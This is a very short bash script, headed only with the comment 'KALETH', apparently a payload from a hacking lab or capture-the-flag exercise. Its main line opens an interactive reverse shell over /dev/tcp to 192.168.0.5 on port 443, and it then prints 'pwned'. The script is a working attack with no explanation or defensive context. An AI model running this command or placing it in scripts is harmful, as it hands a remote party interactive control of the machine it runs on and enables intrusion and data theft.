#!/bin/bash  
# KALETH
bash -c "bash -i >& /dev/tcp/192.168.0.5/443 0>&1"

echo pwned
